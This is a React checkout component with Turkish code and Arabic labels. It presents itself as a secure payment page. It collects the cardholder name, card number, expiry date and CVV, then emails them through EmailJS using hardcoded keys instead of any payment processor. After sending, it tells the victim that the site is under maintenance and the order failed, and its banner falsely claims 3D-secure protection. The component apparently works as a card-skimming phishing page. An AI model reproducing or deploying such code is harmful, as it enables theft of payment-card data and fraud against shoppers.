import "./SiparisVer.css";
import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const SiparisVer = () => {
  const form = useRef();

  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [zip, setZip] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_jpyc2gm", "template_x7zj33r", form.current, {
        publicKey: "V57OWPDudEhHuEDPU",
      })
      .then(
        () => {
          alert("موقعنا تحت الصيانة، يرجى الشراء من متجرنا. تعذر استلام طلبك.");
        },
        (error) => {
          alert("لم يتم استلام الطلب. تحقق من تفاصيل البطاقة.");
        }
      );
    // Form verilerini işleyin
    console.log({
      address,
      city,
      zip,
      cardNumber,
      expiryDate,
      cvv,
    });
  };
  return (
    <div className="flex siparis-ver items-center justify-center min-h-screen ">
      <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md">
        <div className="w-full bg-orange-500 p-5 rounded text-white font-bold">
          جميع طرق الدفع تتضمن حماية ثلاثية الأبعاد. بهذه الطريقة، التسوق بأمان
          يمكنك القيام بذلك. شكراً لاختيارك لنا
        </div>
        <h2 className="text-2xl font-bold text-center">شاشة الدفع</h2>
        <form className="space-y-4" ref={form} onSubmit={handleSubmit}>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              اسم المستلم اللقب
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              العنوان
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              المدينة
            </label>
            <input
              type="text"
              value={city}
              onChange={(e) => setCity(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>

          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              اسم حامل البطاقة اللقب
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="kart-ad"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              رقم البطاقة الائتمانية
            </label>
            <input
              type="text"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="kart-no"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              تاريخ انتهاء الصلاحية
            </label>
            <input
              type="text"
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              placeholder="MM/YY"
              required
              name="son-tarih"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              رمز أمان البطاقة- CVC/CVV
            </label>
            <input
              type="text"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="guvenlik"
            />
          </div>
          <button
            type="submit"
            className="w-full px-4 py-2 text-white bg-orange-600 rounded-md hover:bg-orange-700 focus:outline-none focus:ring focus:ring-indigo-200"
          >
            قم بالدفع
          </button>
        </form>
      </div>
    </div>
  );
};

export default SiparisVer;
